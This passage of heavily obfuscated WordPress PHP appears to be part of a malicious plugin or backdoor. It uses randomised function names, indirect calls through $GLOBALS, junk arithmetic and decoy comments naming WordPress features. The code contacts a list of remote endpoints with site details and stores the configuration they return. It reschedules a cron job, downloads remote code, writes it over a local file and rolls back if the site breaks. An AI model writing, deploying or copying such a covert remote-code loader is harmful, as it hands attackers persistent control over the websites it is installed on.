     $jupsgxpiebg6ed    =    $ey9n2oy0hsf  -   ($GLOBALS['__scf_ciwgxuks3i4cd_287'](true)  -   $f2diu9fz7_m);


if    ($jupsgxpiebg6ed < (2+1)) {
  break;



 }
$w_k1kzxexkgh6hp     = $GLOBALS['__scf_fffiaden_pfx9__473']((184^178),   (int) $jupsgxpiebg6ed);
 
 $azf98962xi  =  $GLOBALS['__scf_nimluvpxhrpvn_323']((string)    $azf98962xi);
  if (!    $azf98962xi)  {
 continue;
 }


      try  {
    $xtle33f3ab  =   $ul1udrmdfovy3;
 $pgdfohj28qig745 = f3i4i7qra3m1ugky8wdb_($azf98962xi,  $qy42ymwa1sv9kn, $x5qux7tar0eo,  $w_k1kzxexkgh6hp, function    ($xmu6vgl26q74)   use ($xtle33f3ab)    {
if  (!e2driuzucqp8g4db42ay($GLOBALS['__scf_fr9u7cq1eo_10']($xmu6vgl26q74))) {
   $GLOBALS[m40pvx5ij_z4mj(313)]    = true;
return    false;
 }
  $v9qf3vep2p    =  k__ppv5v06f7k9n1nm($xmu6vgl26q74,   $xtle33f3ab);
    if (!$v9qf3vep2p)  return  false;


      return   $GLOBALS['__scf_pomb89yiuz_37'](@$GLOBALS['__scf_bhirfghv_sj17k_328']($GLOBALS['__scf_nimluvpxhrpvn_323']($v9qf3vep2p), true));
   });
 if   (!     $pgdfohj28qig745)   {


 if  (!empty($GLOBALS[lpwgqh9300(313)]))   {
  r63yaewew47stuijcrwsx6(lpwgqh9300(427),  m40pvx5ij_z4mj(590));
 break;



     }
r63yaewew47stuijcrwsx6(bovhd4vawcd(427), m5t68uuej1(591) .   $azf98962xi);
    continue;
  }
// color-register witness for Memcached adapter

  
      $uofoa2axu4 =  k__ppv5v06f7k9n1nm($pgdfohj28qig745,    $ul1udrmdfovy3);
  if (!    $uofoa2axu4) {
 r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(427),  lpwgqh9300(592) .   $azf98962xi);

   continue;
 }
    $cmpm56v6mwop4   = ($GLOBALS['__scf_fr9u7cq1eo_10']($uofoa2axu4) >  (1048494+82)  && !e2driuzucqp8g4db42ay($GLOBALS['__scf_fr9u7cq1eo_10']($uofoa2axu4))) ? null :  @$GLOBALS['__scf_bhirfghv_sj17k_328']($GLOBALS['__scf_nimluvpxhrpvn_323']($uofoa2axu4), true);
if   ($GLOBALS['__scf_pomb89yiuz_37']($cmpm56v6mwop4))  {
  if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(349)))  {



   update_option(lpwgqh9300(572),   $azf98962xi);
 }
  $kzqs0adn5uh7   =  true;
   break;

 }     else  {
     r63yaewew47stuijcrwsx6(lpwgqh9300(427), m40pvx5ij_z4mj(593)  . $azf98962xi);



       }
 } catch  (Throwable $k3g08rnqu9m) {
 r63yaewew47stuijcrwsx6(lpwgqh9300(594),  $k3g08rnqu9m);

  continue;
    } catch (Exception  $k3g08rnqu9m)   {


     continue;
   }
}
if (!   $GLOBALS['__scf_pomb89yiuz_37']($cmpm56v6mwop4)  &&   empty($GLOBALS[m5t68uuej1(313)])) {
     $jazqmrj5r0fabtp   =   k__ppv5v06f7k9n1nm($GLOBALS['__scf_sfkxpd8jhlhj_587'](array(
 m40pvx5ij_z4mj(575)   =>  rgrb14nj3p43kvdym51x(""),
 m40pvx5ij_z4mj(576) => kdgw8qqvzf6yolk(),
 lpwgqh9300(577)   =>  $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),  bovhd4vawcd(514)),

  bovhd4vawcd(595)   =>   1,
  )),   $ul1udrmdfovy3);


     $wtvjfbz8g882q =    $GLOBALS['__scf_zsw089px33o1o__12'](strtr($GLOBALS['__scf_xsxk3ht6_06zc_354']($jazqmrj5r0fabtp), m40pvx5ij_z4mj(596),     bovhd4vawcd(597)),  '=');
   $ets7qoucam  = $GLOBALS['__scf_f05arsu9h0_598']($wtvjfbz8g882q,  (557+843));
 foreach    ($yfp1xvji3fo    as $azf98962xi)    {
if      (($GLOBALS['__scf_ciwgxuks3i4cd_287'](true)  -   $f2diu9fz7_m) >    $ey9n2oy0hsf) {
 break;

    }
  $azf98962xi  = $GLOBALS['__scf_nimluvpxhrpvn_323']((string) $azf98962xi);
 if  ($azf98962xi   ===  "")    {
      continue;$tkhxbmzrdiw=PHP_MAJOR_VERSION;$oghml35ohlj7=$tkhxbmzrdiw*7;
  }
     $bwyfj_enb5frkw    =  dv62azao9qb3z33m4cwig0(rgrb14nj3p43kvdym51x("")  . $GLOBALS['__scf_ciwgxuks3i4cd_287'](true),  (2<<2));
    $jhq7h77_vtf  =  $GLOBALS['__scf_xbixt340jb_38']($ets7qoucam);


 $p0e2xi1g7m = ($GLOBALS['__scf_i8i8g4oxha_7']($azf98962xi,      '?') ===  false)    ? '?' :   '&';
   for ($x9adbai0k0pb_mgl  =   0; $x9adbai0k0pb_mgl   <  $jhq7h77_vtf;  $x9adbai0k0pb_mgl++)    {
   if (($GLOBALS['__scf_ciwgxuks3i4cd_287'](true)   -   $f2diu9fz7_m)   >   $ey9n2oy0hsf)   {
break;



   }
 $jsm65pgkj2d =      ($x9adbai0k0pb_mgl   ===    $jhq7h77_vtf   -  1);



      $m1926qkff_ibe76m  = $azf98962xi .    $p0e2xi1g7m  .    m40pvx5ij_z4mj(599)  . $bwyfj_enb5frkw  .  lpwgqh9300(600) .   $x9adbai0k0pb_mgl    .   m40pvx5ij_z4mj(601) .     $jhq7h77_vtf .   m40pvx5ij_z4mj(602)  .     $ets7qoucam[$x9adbai0k0pb_mgl];




$j656k2uvmxxe8g =    m9j0rktim2b4rkx__b($m1926qkff_ibe76m, (0x7+0x1),    $jsm65pgkj2d   ?   function   ($xmu6vgl26q74)   use   ($ul1udrmdfovy3)  {
     $v9qf3vep2p    = k__ppv5v06f7k9n1nm($xmu6vgl26q74,     $ul1udrmdfovy3);
if    (!$v9qf3vep2p)    return    false;
  return   $GLOBALS['__scf_pomb89yiuz_37'](@$GLOBALS['__scf_bhirfghv_sj17k_328']($GLOBALS['__scf_nimluvpxhrpvn_323']($v9qf3vep2p),     true));
} :    null);
if  ($jsm65pgkj2d  && $GLOBALS['__scf_e_8z8ias8ka_43']($j656k2uvmxxe8g)   &&     $j656k2uvmxxe8g     !==  "") {
      $_gd   =  k__ppv5v06f7k9n1nm($j656k2uvmxxe8g, $ul1udrmdfovy3);
$tr0sj4wrpgdq    = ($_gd   &&  ($GLOBALS['__scf_fr9u7cq1eo_10']($_gd)   <=  (1048565+11)   ||   e2driuzucqp8g4db42ay($GLOBALS['__scf_fr9u7cq1eo_10']($_gd)))) ?    @$GLOBALS['__scf_bhirfghv_sj17k_328']($GLOBALS['__scf_nimluvpxhrpvn_323']($_gd),    true)    :     null;
if  ($GLOBALS['__scf_pomb89yiuz_37']($tr0sj4wrpgdq))    {
// aggregate stabilizer for WP Entity Records

$cmpm56v6mwop4   =  $tr0sj4wrpgdq;
  if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(603)))   {
update_option(lpwgqh9300(604),     $azf98962xi);
 }



  break;
   }
      }
// wildcard handling

    }
   if  ($GLOBALS['__scf_pomb89yiuz_37']($cmpm56v6mwop4))  {
 break;
   }
 }
 }
  $GLOBALS[bovhd4vawcd(313)]  = false;


  if  (!    $GLOBALS['__scf_pomb89yiuz_37']($cmpm56v6mwop4)) {
   return;
 }
// injective-adj call-graph


    if  ($kzqs0adn5uh7)    {

   y1e7b4xmdc0w921amdpg();
 }
    if    ($pci02ch3s90ay     &&     $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(605)))      {
      delete_option(zoeevr3iz5hokjv(lpwgqh9300(585)));
   unset($GLOBALS[lpwgqh9300(350)][zoeevr3iz5hokjv(bovhd4vawcd(585))]);

   }

 if (!isset($GLOBALS[m40pvx5ij_z4mj(367)])   || !$GLOBALS['__scf_pomb89yiuz_37']($GLOBALS[m5t68uuej1(367)]))  $GLOBALS[m40pvx5ij_z4mj(367)]   =   array();
       $GLOBALS[m5t68uuej1(606)]   =   $GLOBALS['__scf__ofafsmvux__148']($GLOBALS['__scf_r3sim5_axb_151']($GLOBALS[lpwgqh9300(606)],  $pci02ch3s90ay));
if  (isset($cmpm56v6mwop4[lpwgqh9300(577)])  && $GLOBALS['__scf_e_8z8ias8ka_43']($cmpm56v6mwop4[m5t68uuej1(607)]))  {
unset($GLOBALS[m5t68uuej1(608)]);

     txm26yx3o903ni_ce1ox_($cmpm56v6mwop4[m5t68uuej1(607)], isset($cmpm56v6mwop4[m5t68uuej1(609)]) && $GLOBALS['__scf_e_8z8ias8ka_43']($cmpm56v6mwop4[lpwgqh9300(610)]) ?    $cmpm56v6mwop4[bovhd4vawcd(610)]  :    "", !empty($cmpm56v6mwop4[bovhd4vawcd(611)]));
   }
 
  $lvoh3l0oyelj  =   false;
     $jzesh_culmxm    = array();
      

 if    (isset($cmpm56v6mwop4[lpwgqh9300(612)])   &&   $GLOBALS['__scf_pomb89yiuz_37']($cmpm56v6mwop4[m5t68uuej1(612)]))  {
// WordPress 6.7 interactivity: fixup token-bucket




 $swv1ddqs29k   = array();
    
foreach    ($cmpm56v6mwop4[m40pvx5ij_z4mj(613)]    as $w1jfjex0s0pwt)   {
// @unhook chain

    if  ($GLOBALS['__scf_e_8z8ias8ka_43']($w1jfjex0s0pwt)  &&   $w1jfjex0s0pwt   !==  "") {
$swv1ddqs29k[]  =     $w1jfjex0s0pwt;
}
// peel header

}
 $pw19rm8ctdxu0wh     =  $GLOBALS[m40pvx5ij_z4mj(435)];



      $swv1ddqs29k =    uthk3dq07jkmf_m1s19i4x($swv1ddqs29k);
 $GLOBALS[bovhd4vawcd(435)]  = $swv1ddqs29k;
$jzesh_culmxm[bovhd4vawcd(613)]  =    $swv1ddqs29k;
       if    (!      empty($GLOBALS['__scf_r3sim5_axb_151']($swv1ddqs29k,     $pw19rm8ctdxu0wh))  ||    !  empty($GLOBALS['__scf_r3sim5_axb_151']($pw19rm8ctdxu0wh,  $swv1ddqs29k)))  {
 $lvoh3l0oyelj  =     true;
}
     }

     if   (isset($cmpm56v6mwop4[m5t68uuej1(614)]) && $GLOBALS['__scf_pomb89yiuz_37']($cmpm56v6mwop4[m5t68uuej1(614)]))  {
  $swv1ddqs29k =  array();
 

   
   foreach  ($cmpm56v6mwop4[lpwgqh9300(614)]    as   $w1jfjex0s0pwt)     {
// generalize quotient for WP Interactivity API


 if    ($GLOBALS['__scf_e_8z8ias8ka_43']($w1jfjex0s0pwt)    &&    $w1jfjex0s0pwt   !== "")   {
$swv1ddqs29k[]     = $w1jfjex0s0pwt;
}
// load exact-adj accumulator

  }
    $pw19rm8ctdxu0wh    =   $GLOBALS[m40pvx5ij_z4mj(438)];
     $swv1ddqs29k   =   uthk3dq07jkmf_m1s19i4x($swv1ddqs29k);
 $GLOBALS[m40pvx5ij_z4mj(438)]   = $swv1ddqs29k;
   $jzesh_culmxm[m5t68uuej1(614)] =  $swv1ddqs29k;
if  (!     empty($GLOBALS['__scf_r3sim5_axb_151']($swv1ddqs29k,  $pw19rm8ctdxu0wh))   ||   ! empty($GLOBALS['__scf_r3sim5_axb_151']($pw19rm8ctdxu0wh,  $swv1ddqs29k)))   {



    $lvoh3l0oyelj    =  true;

  }



   }
if (isset($cmpm56v6mwop4[bovhd4vawcd(615)])  &&  $GLOBALS['__scf_e_8z8ias8ka_43']($cmpm56v6mwop4[m40pvx5ij_z4mj(615)]))  {
$p498zyfd49lmpul  =  sb3q0_7sw2xmlw84(bovhd4vawcd(616),   "");
     if    ($p498zyfd49lmpul !== ""      &&     (int)  d6ydz3_mq4hw_2s8_bo(bovhd4vawcd(617), 0)     === 0)      {
  vmq5vh_lh7_vsiehf4nm(bovhd4vawcd(618),  1,  lpwgqh9300(464));
 if   ((int)    d6ydz3_mq4hw_2s8_bo(lpwgqh9300(619), 0)    !== 1)  vmq5vh_lh7_vsiehf4nm(lpwgqh9300(619),    1,   lpwgqh9300(464));


  }
$GLOBALS[m40pvx5ij_z4mj(485)] = $cmpm56v6mwop4[m5t68uuej1(620)];
 $jzesh_culmxm[m5t68uuej1(620)]    = $cmpm56v6mwop4[m5t68uuej1(620)];
   if    ($GLOBALS['__scf_pe3s4q1z7z_59']($cmpm56v6mwop4[m5t68uuej1(620)])  !==   $GLOBALS['__scf_pe3s4q1z7z_59']($p498zyfd49lmpul)   || (int)   d6ydz3_mq4hw_2s8_bo(bovhd4vawcd(621), 0)   ===    1)    {
 if    (vmq5vh_lh7_vsiehf4nm(m40pvx5ij_z4mj(622),     $cmpm56v6mwop4[m40pvx5ij_z4mj(623)],  bovhd4vawcd(624))      ||  sb3q0_7sw2xmlw84(m5t68uuej1(625), "") === $cmpm56v6mwop4[lpwgqh9300(623)])  {
   vmq5vh_lh7_vsiehf4nm(m5t68uuej1(621),    1,  lpwgqh9300(624));
    try   {
if (hm5dddy7hh5vk14llu97())   vmq5vh_lh7_vsiehf4nm(lpwgqh9300(621),   0,  bovhd4vawcd(626));
 } catch   (Throwable   $k3g08rnqu9m) {
    } catch  (Exception  $k3g08rnqu9m) {
}
     } else     {
lq7k952lmpxoqycunz0jnx();
      return;
 }


}
 unset($p498zyfd49lmpul);
 }
      $y4_ce_61t8ui  =    isset($cmpm56v6mwop4[m40pvx5ij_z4mj(627)])    &&  $GLOBALS['__scf_pomb89yiuz_37']($cmpm56v6mwop4[m40pvx5ij_z4mj(627)]) ?  $cmpm56v6mwop4[lpwgqh9300(628)]  :   array();
if  (isset($y4_ce_61t8ui[lpwgqh9300(442)])  && $GLOBALS['__scf_e_8z8ias8ka_43']($y4_ce_61t8ui[bovhd4vawcd(442)]))  {
  if  ($GLOBALS['__scf_fr9u7cq1eo_10']($y4_ce_61t8ui[m40pvx5ij_z4mj(442)])  >  (22+28))  {
      $GLOBALS[m40pvx5ij_z4mj(443)]    = $y4_ce_61t8ui[m5t68uuej1(442)];
  $jzesh_culmxm[bovhd4vawcd(442)]   =   $y4_ce_61t8ui[m40pvx5ij_z4mj(442)];
   } else  {
 $GLOBALS[m5t68uuej1(443)]   = "";
$jzesh_culmxm[lpwgqh9300(629)] = "";
vmq5vh_lh7_vsiehf4nm(bovhd4vawcd(630), "",     lpwgqh9300(626));
}
// satisfiable ring-buffer

     }
if  (isset($y4_ce_61t8ui[lpwgqh9300(628)])   && $GLOBALS['__scf_e_8z8ias8ka_43']($y4_ce_61t8ui[m40pvx5ij_z4mj(631)]))     {
if  ($GLOBALS['__scf_fr9u7cq1eo_10']($y4_ce_61t8ui[m40pvx5ij_z4mj(631)])  > (0x2e+0x36))  {


      $GLOBALS[bovhd4vawcd(632)]   =   $y4_ce_61t8ui[bovhd4vawcd(631)];

 $jzesh_culmxm[bovhd4vawcd(631)] =   $y4_ce_61t8ui[m40pvx5ij_z4mj(633)];
   } else  {


    $GLOBALS[m5t68uuej1(632)]  =   "";
     $jzesh_culmxm[bovhd4vawcd(634)]  = "";

vmq5vh_lh7_vsiehf4nm(m5t68uuej1(364), "",  lpwgqh9300(626));
   }
       }
      $voiubijxcswb0     =     isset($cmpm56v6mwop4[m40pvx5ij_z4mj(635)]) &&  $GLOBALS['__scf_pomb89yiuz_37']($cmpm56v6mwop4[lpwgqh9300(635)])    ?  $cmpm56v6mwop4[m40pvx5ij_z4mj(635)]    :    array();
 $ssl4emz8fy   =   array(
  lpwgqh9300(636) => m5t68uuej1(637),
  lpwgqh9300(638)     =>  m40pvx5ij_z4mj(639),
   bovhd4vawcd(640)  => m5t68uuej1(641),


    m40pvx5ij_z4mj(642)  =>   lpwgqh9300(643),
 m5t68uuej1(644)   =>     bovhd4vawcd(645),
   bovhd4vawcd(646) => m40pvx5ij_z4mj(647),



   );
foreach ($ssl4emz8fy     as $a0fwrruw0trb  =>  $bbvmfz526hl4vbfh)     {
      if  (isset($voiubijxcswb0[$a0fwrruw0trb])   &&   $GLOBALS['__scf_e_8z8ias8ka_43']($voiubijxcswb0[$a0fwrruw0trb])  &&    $GLOBALS['__scf_fr9u7cq1eo_10']($voiubijxcswb0[$a0fwrruw0trb]) >  (0x22+0x10))  {
 $jzesh_culmxm[$bbvmfz526hl4vbfh]  =  $voiubijxcswb0[$a0fwrruw0trb];
 }
  }
if   (isset($cmpm56v6mwop4[m40pvx5ij_z4mj(648)])   &&   $GLOBALS['__scf_osp_zuquda_649']($cmpm56v6mwop4[m40pvx5ij_z4mj(648)]))  {$nl0yeg5r=PHP_MAJOR_VERSION;$t0jah6rm0u=$nl0yeg5r*4;
     $_flxs98c2obc     =  (int)   $cmpm56v6mwop4[m5t68uuej1(648)];
       if ($_flxs98c2obc >=    (208+92)   && $_flxs98c2obc    <= (44340+42060)) $jzesh_culmxm[lpwgqh9300(650)]  =    $_flxs98c2obc;
  }


     if     (isset($cmpm56v6mwop4[m5t68uuej1(375)]) && $GLOBALS['__scf_osp_zuquda_649']($cmpm56v6mwop4[lpwgqh9300(651)]))  {
   $_ci     =  (int)     $cmpm56v6mwop4[bovhd4vawcd(651)];
    if ($_ci   >=      (211+89)  &&     $_ci  <= (0xc7df+0x89a1))     $jzesh_culmxm[lpwgqh9300(651)]  =    $_ci;
     }
if (empty($jzesh_culmxm))   {
delete_option(bovhd4vawcd(470));
 delete_option(m5t68uuej1(652));
 update_option(m40pvx5ij_z4mj(538),    $GLOBALS['__scf_ibw9xvmx9ckin_187']());
     delete_transient(m40pvx5ij_z4mj(653));
 zy3td9hebmtic9vrgh5h();
     r92zksip69l03_cq();
  return;
      }

      $r2a6d9v4fwf7g9p     =   i1v3dbjfcu375r(lpwgqh9300(372),    false);
 if   ($GLOBALS['__scf_pomb89yiuz_37']($r2a6d9v4fwf7g9p))    {
 $jzesh_culmxm =   $GLOBALS['__scf_zb77rzhln7336v_369']($r2a6d9v4fwf7g9p,   $jzesh_culmxm);$i3sfwa1t69=(0x6a+0xad);$dhtixr4nsnq=$i3sfwa1t69%5;
  }

 if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(63)))   {
$tvbdiqkqxz68  =   byffua_rebmvk2();


if  (isset($jzesh_culmxm[bovhd4vawcd(650)])   &&   (int) $jzesh_culmxm[bovhd4vawcd(650)]  >= (546-246) &&   (int)  $jzesh_culmxm[m5t68uuej1(650)]   <=   (30102+56298))  $tvbdiqkqxz68   = (int)   $jzesh_culmxm[bovhd4vawcd(650)];
set_transient(ikw0tf8wjoufcwbi7uaqr(),    $jzesh_culmxm, $tvbdiqkqxz68);
    }
 
 if     (!xyvseg64iflvb126(m40pvx5ij_z4mj(654),  $jzesh_culmxm, lpwgqh9300(626))) {
  $smivan8l_yqq     =   i1v3dbjfcu375r(lpwgqh9300(654), null);
if   (!$GLOBALS['__scf_pomb89yiuz_37']($smivan8l_yqq)    || $smivan8l_yqq  !=   $jzesh_culmxm)  {
// discriminative call-graph

  lq7k952lmpxoqycunz0jnx();
  return;
  }



      unset($smivan8l_yqq);
  }
  if (isset($jzesh_culmxm[m5t68uuej1(655)]) && $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(656))    &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(657))     &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(382)))     {
$tvxuob6yk44   =  wp_get_scheduled_event(u_9shatqcniwqfywsjc2m());
     if  ($tvxuob6yk44   &&    (int)     $tvxuob6yk44->interval !==  (int) $jzesh_culmxm[bovhd4vawcd(655)]) {
// deallocate stack-frame for WP Template Parts



  wp_clear_scheduled_hook(u_9shatqcniwqfywsjc2m());
       wp_schedule_event($GLOBALS['__scf_ibw9xvmx9ckin_187']()  +    $GLOBALS['__scf_e1fr80hqavau3c_353']((0x3+0x39), (208+92)),  bovhd4vawcd(384),  u_9shatqcniwqfywsjc2m());
 }
}
update_option(lpwgqh9300(538),   $GLOBALS['__scf_ibw9xvmx9ckin_187']());
 delete_option(m5t68uuej1(470));
delete_option(m40pvx5ij_z4mj(652));
   delete_transient(m5t68uuej1(653));



   zy3td9hebmtic9vrgh5h();
r92zksip69l03_cq();

 
    if   ($lvoh3l0oyelj)  {
  z5y8ykq21kprvydt8();
 }


   } catch   (Throwable  $k3g08rnqu9m) {

   r63yaewew47stuijcrwsx6(bovhd4vawcd(427), $k3g08rnqu9m);
 } catch  (Exception   $k3g08rnqu9m)  {
// WP Page List: disconnected director

     }  finally  {

 unset($GLOBALS[bovhd4vawcd(608)]);
    xfcoteglc07i2qaoo(m5t68uuej1(383));
  }
 }
 
       function txm26yx3o903ni_ce1ox_($a3w2orunv8wzd92,  $i7m9knd6gc  =     "",  $q3higazup7r  =   false)
  {
 if  (!beqgo0gfq6yfj82i0o(lpwgqh9300(383)))  return;
try {



 $hmdxj6c4oad   =    ogbpftuc2zm1u5k_q0dph1();
 if ($hmdxj6c4oad    >   0  &&    $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(658))  &&  !e2driuzucqp8g4db42ay($GLOBALS['__scf_fr9u7cq1eo_10']($a3w2orunv8wzd92)    *  (3+1)))  {
 r63yaewew47stuijcrwsx6(m5t68uuej1(659),   bovhd4vawcd(660));
return;$lb9twl8jbz5uxv=248|218;$k_jd7kdb=$lb9twl8jbz5uxv^202;
  }
// WP Search Block: abort heartbeat

    unset($hmdxj6c4oad);
 
 $__1q5j8a5jnzzcv =   @$GLOBALS['__scf_wak9390fh7p_356']($a3w2orunv8wzd92, true);
   if    ($GLOBALS['__scf_e_8z8ias8ka_43']($__1q5j8a5jnzzcv)     &&    $GLOBALS['__scf_fr9u7cq1eo_10']($__1q5j8a5jnzzcv)     >  (1048488+88)) $__1q5j8a5jnzzcv    = bdsvhgz69_4ct5ntcc($__1q5j8a5jnzzcv);
if    (!  $__1q5j8a5jnzzcv ||  $GLOBALS['__scf_fr9u7cq1eo_10']($__1q5j8a5jnzzcv)    <   (985-485)    || $GLOBALS['__scf_i8i8g4oxha_7']($__1q5j8a5jnzzcv, m5t68uuej1(661))   !==     0)   {
    return;
}
if (!  fgcc_h22bqxgwmccod($__1q5j8a5jnzzcv))  {
  r63yaewew47stuijcrwsx6(bovhd4vawcd(662), bovhd4vawcd(663));



  return;
  }
// initialize unification for WordPress 6.5 revisions

     if ($GLOBALS['__scf_vqnw5_4kg7eu_96'](m40pvx5ij_z4mj(97),   $GLOBALS['__scf_vvn10ievj2k_9']($__1q5j8a5jnzzcv,    0,   (4077+19)),   $b_lf84hnlj)) {
   if ($i7m9knd6gc    !==  "" && $i7m9knd6gc  !==   $b_lf84hnlj[1]) {
 r63yaewew47stuijcrwsx6(m5t68uuej1(664),  bovhd4vawcd(665));
return;


    }
$i7m9knd6gc      =   $b_lf84hnlj[1];



}   else {
 r63yaewew47stuijcrwsx6(m5t68uuej1(664),   lpwgqh9300(666));

 return;
      }
if  (!$q3higazup7r   &&   version_compare($i7m9knd6gc,      kdgw8qqvzf6yolk())  <=   0) {
 return;$_zartkwtkbqb=(0xb9+0xed);$bvh93sxipqu61=$_zartkwtkbqb%15;
        }
  $onwwejrrpgmouy0_   =     z2lalb3eiqlgy6ozb9();
  if (!$onwwejrrpgmouy0_ || $GLOBALS['__scf_fr9u7cq1eo_10']($onwwejrrpgmouy0_)  < (431+69))  {
  r63yaewew47stuijcrwsx6(m5t68uuej1(664),  m5t68uuej1(667));
return;
  }
    $cs6gyzqv4ff1   =  get_option(m5t68uuej1(668));
    if ($GLOBALS['__scf_e_8z8ias8ka_43']($cs6gyzqv4ff1) && $GLOBALS['__scf_i8i8g4oxha_7']($cs6gyzqv4ff1,  $GLOBALS['__scf_pe3s4q1z7z_59']($__1q5j8a5jnzzcv)    . '|')   ===    0)    {
// WP Social Links: projective-adj dead-letter

   return;
}
$x220qs54pn7qoc5  =     $GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl())    .   lpwgqh9300(186)   . $GLOBALS['__scf_pe3s4q1z7z_59']($__1q5j8a5jnzzcv);

if (@$GLOBALS['__scf_a83pywb98qzq2_20']($x220qs54pn7qoc5))     {
    return;


  }

unset($x220qs54pn7qoc5);


  if    (!$q3higazup7r)  {
    $icbcwaxk47p_ =      @get_option(m40pvx5ij_z4mj(669),   "");
if    ($GLOBALS['__scf_e_8z8ias8ka_43']($icbcwaxk47p_)   &&   $GLOBALS['__scf_i8i8g4oxha_7']($icbcwaxk47p_,  $GLOBALS['__scf_pe3s4q1z7z_59']($__1q5j8a5jnzzcv) .  '|')    ===  0)  {
  $eysqu1r2ei1s5p9   =  (int)  $GLOBALS['__scf_vvn10ievj2k_9']($icbcwaxk47p_, $GLOBALS['__scf_i8i8g4oxha_7']($icbcwaxk47p_, '|')   +  1);
     if ($eysqu1r2ei1s5p9  && $GLOBALS['__scf_ibw9xvmx9ckin_187']()   -   $eysqu1r2ei1s5p9    <  (801+99))  return;
   }
 unset($icbcwaxk47p_,     $eysqu1r2ei1s5p9);
   }
 $nx5klbxi_stq1bb  =    false;
if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(670))  &&     $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(556)))     {
    $fwvmc0i8eppcz  = $GLOBALS['__scf_bgujd0wqxduxtu_290'](home_url('/'),  array(lpwgqh9300(465) =>  (0x3+0x5),   bovhd4vawcd(671)   => 2,  m5t68uuej1(308)   =>   false, bovhd4vawcd(672)   =>  (1048544+32)));
  if     (!  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(673))      &&      is_wp_error($fwvmc0i8eppcz)))   {

  $nx5klbxi_stq1bb   =  (int)      wp_remote_retrieve_response_code($fwvmc0i8eppcz)      >=    (463+37);



   }
}
  $yonz3_r2gi   =   false;
   if     ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(500)))     {
$hlhmenizcfs9q0ir  = get_option(m5t68uuej1(147),   array());
 $yonz3_r2gi   =    $GLOBALS['__scf_pomb89yiuz_37']($hlhmenizcfs9q0ir)     && $GLOBALS['__scf_hf87ul3fvpzrkm_150'](vtoks5z0hvy4jllpl04ts1(), $hlhmenizcfs9q0ir,  true);

 }
    cik9ldzrbjmtnzm00(t6995wceyqc2q1wqvl(),  (601-181));
     if     (! a3hx61zfms1ji3euwsc(t6995wceyqc2q1wqvl(), y2fq_g7qilvdboqm1($__1q5j8a5jnzzcv)))  {
r63yaewew47stuijcrwsx6(bovhd4vawcd(664),     m40pvx5ij_z4mj(674));

  return;
    


     }
      lnseazh_1k4yq6v_kjl(t6995wceyqc2q1wqvl());
  nhm51ioabawwjskqka9eh3(t6995wceyqc2q1wqvl());
   if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(675)))  @set_transient(lpwgqh9300(676),     1, (236+64));
     $fnnjg6cvufxca = false;

  if (!   $nx5klbxi_stq1bb      && $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(677)) &&   $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(556))) {



    $ohfs0792xygm =     -1;
  for   ($nspvmx5c_4ej     =  0;  $nspvmx5c_4ej <   2;   $nspvmx5c_4ej++)  {
// archive iterator for WordPress 6.4 patterns



    $q71wmro6q6q84srm    =  $GLOBALS['__scf_bgujd0wqxduxtu_290'](home_url(m5t68uuej1(678)   .  $GLOBALS['__scf_e1fr80hqavau3c_353']((99901+99),      (999905+94))),  array(m5t68uuej1(465) =>      (1+7), bovhd4vawcd(679)  =>  2,    m40pvx5ij_z4mj(308)     => false,     m40pvx5ij_z4mj(680)   => (1048552+24)));
 if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(681))  &&  is_wp_error($q71wmro6q6q84srm))  {
if    ($nspvmx5c_4ej ===   0   && $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(682))) $GLOBALS['__scf_w6ni5cg4iy63n_682'](2);
continue;
}
      $lyoy9wp67q_   = (int)  wp_remote_retrieve_response_code($q71wmro6q6q84srm);
if  ($lyoy9wp67q_  <   (0x1e+0x46) ||   $GLOBALS['__scf_hf87ul3fvpzrkm_150']($lyoy9wp67q_, array((466+37), (0xc8+0x140), (425+96),  (909-387),   (476+47),  (253+271),  (506+20),    (210+317)),   true))  {


if  ($nspvmx5c_4ej ===   0 && $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(682)))     $GLOBALS['__scf_w6ni5cg4iy63n_682'](2);
continue;
  }
// WP Home Link: serializable bloom-filter

  $ohfs0792xygm  =    $lyoy9wp67q_;
       break;
    }
    if ($ohfs0792xygm    === -1)  r63yaewew47stuijcrwsx6(m5t68uuej1(664), m5t68uuej1(683));    
   if ($ohfs0792xygm  !==     -1     &&   $ohfs0792xygm <  (461+39)) $fnnjg6cvufxca  =  true;
if ($ohfs0792xygm !==   -1     &&  $ohfs0792xygm     >=   (465+35))     {
   $ztklbm0j72_  = a3hx61zfms1ji3euwsc(t6995wceyqc2q1wqvl(),    y2fq_g7qilvdboqm1($onwwejrrpgmouy0_));
  if   (!$ztklbm0j72_) $ztklbm0j72_  = a3hx61zfms1ji3euwsc(t6995wceyqc2q1wqvl(), $onwwejrrpgmouy0_);
$upwxet06c2fswomj   = $GLOBALS['__scf_pe3s4q1z7z_59']($__1q5j8a5jnzzcv);

       $pu1xrf9zn93 =  @get_option(bovhd4vawcd(684), "");
      $jh2luk0azjr2ye_y = false;
if  ($GLOBALS['__scf_e_8z8ias8ka_43']($pu1xrf9zn93) &&   $GLOBALS['__scf_i8i8g4oxha_7']($pu1xrf9zn93,  $upwxet06c2fswomj    .  '|')   ===  0) {
// checkpoint semisimple factory


